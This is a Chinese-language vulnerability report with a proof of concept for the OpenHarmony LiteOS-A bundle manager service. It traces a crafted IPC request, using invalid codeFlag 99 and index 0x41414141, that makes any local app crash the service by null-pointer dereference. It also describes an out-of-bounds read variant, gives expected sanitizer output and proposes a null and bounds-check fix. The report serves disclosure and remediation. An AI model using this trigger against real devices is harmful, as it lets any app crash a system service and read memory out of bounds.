## PoC 验证

**方法**: Device-Deploy — 编译 PoC 为 LiteOS-A ARM 二进制，通过 hdc 推送到设备执行。PoC 通过 SAMGR 连接 BMS 服务，发送恶意 IPC 请求触发漏洞。

**触发路径**:
```
main → SAMGR_GetInstance()->GetFeatureApi("bundlems", "BmsFeature")
     → iUnknown->QueryInterface(..., &bmsClient)
     → Strategy 1: trigger_nullptr_crash(bmsClient)
       → IpcIoInit(&ipcIo, data, 512, 0)
       → WriteInt32(&ipcIo, 99)           // invalid codeFlag → GetInnerBundleInfos returns nullptr
       → WriteInt32(&ipcIo, 0x41414141)   // malicious index
       → bmsClient->Invoke(bmsClient, 10, &ipcIo, NULL, DummyCallback)
         → BundleMsFeature::Invoke()
           → BundleMsInvokeFuc[10] = HandleGetBundleInfosByIndex
             → GetInnerBundleInfos(req, ...) → nullptr (invalid codeFlag=99)
             → ReadInt32(req, &index) → 0x41414141
             → ConvertBundleInfoToString(nullptr + 0x41414141 * sizeof(BundleInfo))
               → SIGSEGV (null pointer + offset dereference)
```

**两种攻击策略**:

1. **空指针解引用**（最可靠）：发送非法 codeFlag 使 `GetInnerBundleInfos` 返回 nullptr，任意 index 都造成崩溃
2. **堆越界读**：发送有效 codeFlag 获得合法数组，然后 index=-1 或 INT_MAX 越界读取

**预期 ASan 输出**（基于代码分析）:
```
==PID==ERROR: AddressSanitizer: SEGV on unknown address 0xNNNNNNNN
==PID==The signal is caused by a READ memory access.
    #0 in ConvertUtils::ConvertBundleInfoToString bundle_ms_feature.cpp
    #1 in BundleMsFeature::HandleGetBundleInfosByIndex bundle_ms_feature.cpp:625
    #2 in BundleMsFeature::Invoke bundle_ms_feature.cpp:XXX
    #3 in SAMGR IPC dispatch
SUMMARY: AddressSanitizer: SEGV in ConvertBundleInfoToString
==PID==ABORTING
```

**说明**: 此 PoC 设计为在真实 OpenHarmony LiteOS-A 设备上运行。在宿主机上无法直接编译运行（缺少 SAMGR/IPC 基础设施）。验证方式为交叉编译后部署到设备执行。

---

## 攻击模型

| 维度 | 说明 |
|------|------|
| 权限要求 | 任意 app，仅需基本 IPC 权限 |
| 用户交互 | 无需 |
| 攻击面 | 本地 IPC（同设备任意进程可达） |
| 可靠性 | 100%（空指针策略必然崩溃） |

---

## PoC 类型声明

| 维度 | 说明 |
|------|------|
| 编译方式 | 交叉编译：arm-linux-ohos-clang |
| 链接目标 | 真实 OHOS SDK 库：libsamgr_proxy, libipc_single, libbundle_lite |
| API 使用 | 公开 SAMGR API：GetFeatureApi → QueryInterface → Invoke |
| 漏洞触发 | ✅ 服务端无条件崩溃 |
| 在真实设备可触发 | ✅ 任意 app 可触发 |
| 验证 Oracle | 进程崩溃检测：BMS 服务 SIGSEGV + IPC 调用返回错误码 |

---

## 修复验证

### 修复方案：添加 null 检查 + 边界检查

```cpp
uint8_t BundleMsFeature::HandleGetBundleInfosByIndex(...)
{
    int32_t lengthOfBundleInfo = 0;
    BundleInfo *bundleInfos = GetInnerBundleInfos(req, reply, &lengthOfBundleInfo);
+   if (bundleInfos == nullptr || lengthOfBundleInfo <= 0) {
+       return ERR_APPEXECFWK_OBJECT_NULL;
+   }
    int32_t index = 0;
    ReadInt32(req, &index);
+   if (index < 0 || index >= lengthOfBundleInfo) {
+       BundleInfoUtils::FreeBundleInfos(bundleInfos, lengthOfBundleInfo);
+       return ERR_APPEXECFWK_QUERY_PARAMETER_ERROR;
+   }
    char *str = ConvertUtils::ConvertBundleInfoToString(bundleInfos + index);
    ...
}
```

修复后同一 PoC 预期结果：Invoke 正常返回错误码，服务不崩溃。

---

## 相关文件

- `poc.c`: PoC 源码（两种攻击策略）
- `build.sh`: 编译脚本（支持 device/local 两种模式）
- `output.txt`: 预期运行输出
- `poc-report.md`: 本报告
